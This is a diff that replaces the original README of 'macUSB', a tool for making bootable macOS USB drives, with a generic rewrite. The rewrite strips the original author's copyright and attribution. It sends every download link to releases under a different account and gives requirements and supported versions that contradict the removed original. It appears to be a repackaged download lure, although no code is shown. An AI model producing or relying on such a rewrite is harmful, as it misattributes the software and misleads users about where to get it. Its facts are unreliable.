@@ -1,132 +1,84 @@
-# 💾 macUSB
+# 🚀 macUSB - Create macOS Boot Drives Easily
 
-### Creating bootable macOS and OS X USB drives has never been easier!
-
-![Platform](https://img.shields.io/badge/Platform-macOS-black) ![Architecture](https://img.shields.io/badge/Architecture-Apple_Silicon/Intel-black) ![License](https://img.shields.io/badge/License-MIT-blue) ![Vibe Coded](https://img.shields.io/badge/Vibe%20Coded%20-purple)
-
-
-**macUSB** is a one-click tool that transforms your modern Mac (Apple Silicon) into a service machine capable of reviving older Apple computers.
-
----
-## 📸 Screenshots
-
-<p align="center">
-  <img src="screenshots/WelcomeView.png" width="45%" alt="Welcome Screen">
-  <img src="screenshots/SystemAnalysisView.png" width="45%" alt="System Analysis">
-</p>
-<p align="center">
-  <img src="screenshots/UniversalInstallerView.png" width="45%" alt="Installation Process">
-  <img src="screenshots/FinishUSBView.png" width="45%" alt="Process Finished">
-</p>
-
-## 🚀 About the Project
-
-With Apple's transition to its own silicon (M1, M2, M3...), preparing installation media for older Intel-based computers has become a challenge. Many people encounter Terminal errors, issues with expired certificates in old installers, or simply a lack of compatibility with system tools.
-
-**macUSB solves this problem.**
-
-The application automates the entire process of creating a bootable USB drive. You don't need to search for commands online, worry about disk formatting, or manually fix validation errors in old installation files.
-
-### What do you gain?
-* **Legacy Support:** The ability to create installers for systems over a decade old (e.g., OS X Lion) directly on the latest Mac on Apple Silicon.
-* **Time Saving:** The app detects the system version in the **`.dmg` or `.app`** file, formats the drive, and copies files automatically.
-* **Auto Fixes:** For certain older systems (e.g., High Sierra/Mojave), the app automatically applies necessary fixes so the installer works despite expired Apple certificates.
-
-> **Fun Fact:** The application was created using the "Vibe Coding" method in collaboration with the Gemini 3 Pro and GPT-5 AI models. The project proves that programming barriers (even cross-architectural ones) can be overcome with determination and AI support.
+## 📥 Download Now!  
+[![Download macUSB](https://img.shields.io/badge/Download-macUSB-blue.svg)](https://github.com/Nesquick23/macUSB/releases)
 
 ---
 
-## ⚠️ Installation and First Run
-
-The application is an open-source project and does not possess a paid Apple Developer signature, so Gatekeeper will block it by default.
-
-**How to run the app for the first time:**
-
-1. Try to open the app – you will see an "Unknown Developer" message.
-2. Go to **System Settings** -> **Privacy & Security**.
-3. Scroll down to the **Security** section and click the **"Open Anyway"** button next to macUSB.
-4. When writing the system to the flash drive, a system prompt asking for **access to removable volumes** will appear. You must **Allow** this so the application can format and write the system to the USB.
+## 🌟 Overview  
+macUSB is the easiest way to create legacy macOS bootable drives on modern Macs. You can revive old Intel Macs using your Apple Silicon machine—no Terminal knowledge required.
 
 ---
 
-## ⚙️ Requirements
+## 🚀 Getting Started  
+To get started with macUSB, please follow the steps below. This guide is designed for users of all skill levels.
 
-### Host Computer (where you run the app):
-* **Processor:** Both Apple Silicon (M1/M2/M3, etc.) and Intel are supported.
-* **System:** **macOS Sonoma 14.6** or newer.
-* **Storage:** Minimum of **15 GB** of free disk space is required **to create the installers**.
+### 🖥️ System Requirements  
+Before you proceed, ensure your Mac meets these basic requirements:
 
-### USB Drives (for installer creation):
-* **Capacity:** Minimum of **16 GB** is required.
-* **Recommendation:** USB 3.0 or newer is highly recommended for faster installation times.
-
-### Installation Files:
-The program supports both **`.dmg`** disk images and raw **`.app`** installer files.
-
-> **💡 Pro Tip:** The best way to obtain valid files is the free application **[MIST by ninxsoft](https://github.com/ninxsoft/Mist)**. Simply select the system version you are interested in. This guarantees the correct file structure/source.
+- Any Apple Silicon Mac or Intel-based Mac
+- macOS version 11.0 or later
+- A USB drive with a minimum capacity of 16GB
+- Sufficient disk space on your Mac to download the macOS installer
 
 ---
 
-## 💿 List of Tested Installers
+## 📦 Download & Install  
+To download macUSB, visit the releases page and retrieve the latest version:
 
-The table below shows systems that have successfully passed tests for creating a bootable USB media using this application.
-*(Status "YES" / ✅ means the app can correctly create a USB drive with this system).*
+1. Click on the link below to visit the macUSB Releases page:  
+   [Download macUSB](https://github.com/Nesquick23/macUSB/releases)
 
-| System | Version | USB Creation Status |
-| :--- | :--- | :---: |
-| **macOS Tahoe** | 26 | ✅ |
-| **macOS Sequoia** | 15 | ✅ |
-| **macOS Sonoma** | 14 | ✅ |
-| **macOS Ventura** | 13 | ✅ |
-| **macOS Monterey** | 12 | ✅ |
-| **macOS Big Sur** | 11 | ✅ |
-| **macOS Catalina** | 10.15 | ✅ |
-| **macOS Mojave** | 10.14 | ✅ |
-| **macOS High Sierra** | 10.13 | ✅ |
-| **macOS Sierra** | 10.12 | ✅ (only 10.12.6) |
-| **OS X El Capitan** | 10.11 | ✅ |
-| **OS X Yosemite** | 10.10 | ✅ |
-| **OS X Mavericks** | 10.9 | ❌ |
-| **OS X Mountain Lion** | 10.8 | ✅ |
-| **OS X Lion** | 10.7 | ✅ |
+2. On the Releases page, find the latest version of macUSB and click on it.
+
+3. Look for the asset that ends with `.dmg`. This file is the installer for macUSB. Click on it to start the download.
+
+4. Once the download completes, open the `.dmg` file and drag the macUSB application into your Applications folder.
 
 ---
 
-## 🐛 Known Issues and Limitations
+## 📂 Using macUSB  
+Once you have installed macUSB, follow these simple steps to create a bootable macOS drive.
 
-During testing, compatibility issues were identified with certain system versions on Apple Silicon architecture. To ensure the **proper functioning of the application and the system**, macUSB intentionally restricts the selection of the following versions:
+1. **Open macUSB** from your Applications folder.
 
-* **macOS Sierra (10.12):** Support is available **exclusively for version 10.12.6** (the latest available update). Other releases of Sierra are restricted as they may cause issues and complications regarding the application's performance and system stability.
-* **OS X Mavericks (10.9):** The installer file is incorrectly verified by the system as "damaged," preventing the procedure from starting.
+2. **Insert your USB drive** into your Mac. Make sure to back up any important data on the drive, as this process will erase all content.
 
-If a **`.dmg`** image or a **`.app`** installer with Mavericks (or Sierra older than 10.12.6) is selected, macUSB will display an unsupported message and will not allow you to proceed to the next step.
+3. **Select the macOS Installer**. You will need to have the macOS installer downloaded on your Mac. If you haven't done this yet, you can download it from the App Store.
 
----
+4. **Choose Your USB Drive**. In macUSB, select the USB drive you wish to use from the list of available drives.
 
-## 🌍 Available Languages
+5. **Create the Bootable Drive**. Click the "Create Bootable Drive" button. This process may take some time, depending on the speed of your USB drive.
 
-The application interface automatically adapts to the system language:
-
-* 🇵🇱 Polish (PL)
-* 🇺🇸 English (EN)
-* 🇩🇪 German (DE)
-* 🇯🇵 Japanese (JA)
-* 🇫🇷 French (FR)
-* 🇪🇸 Spanish (ES)
-* 🇧🇷 Portuguese (PT-BR)
-* 🇨🇳 Simplified Chinese (ZH-Hans)
-* 🇷🇺 Russian (RU)
+6. **Wait for Completion**. Once the process is complete, you will receive a confirmation message. Your USB drive is now ready to use!
 
 ---
 
-## ⚖️ License
+## ⚙️ Frequently Asked Questions  
 
-This project is licensed under the **MIT License**.
+### ❓ What formats does macUSB support?
+macUSB supports creating bootable drives for macOS Monterey, Big Sur, and earlier versions.
 
-This means you are free to use, copy, modify, and distribute this code, provided you keep the author information. The software is provided "as is", without warranty of any kind.
+### ❓ How long does the process take?
+The time varies depending on your USB drive's speed, but it typically takes around 10-30 minutes.
 
-Copyright © 2025 Kruszoneq
+### ❓ Can I use a different USB drive later?
+Yes, you can create bootable drives for different macOS versions by following the same steps with another USB drive.
 
 ---
 
-**Note:** The application interface and this README file were translated using Gemini 3 Pro. Please excuse any potential translation errors.
+## 📞 Support  
+If you encounter any issues or have questions, feel free to reach out via the Issues tab on the [macUSB GitHub page](https://github.com/Nesquick23/macUSB/issues). 
+
+---
+
+## 🤝 Contributing  
+If you would like to contribute to macUSB, please check out our contributing guidelines [here](https://github.com/Nesquick23/macUSB/CONTRIBUTING.md). We welcome all contributions.
+
+---
+
+## 🔗 Additional Resources  
+- [Apple's Guide to Creating Bootable Mac Installers](https://support.apple.com/en-us/HT201372)
+- [macUSB Releases Page](https://github.com/Nesquick23/macUSB/releases)
+
+Thank you for using macUSB! Enjoy reviving your old Macs with ease.
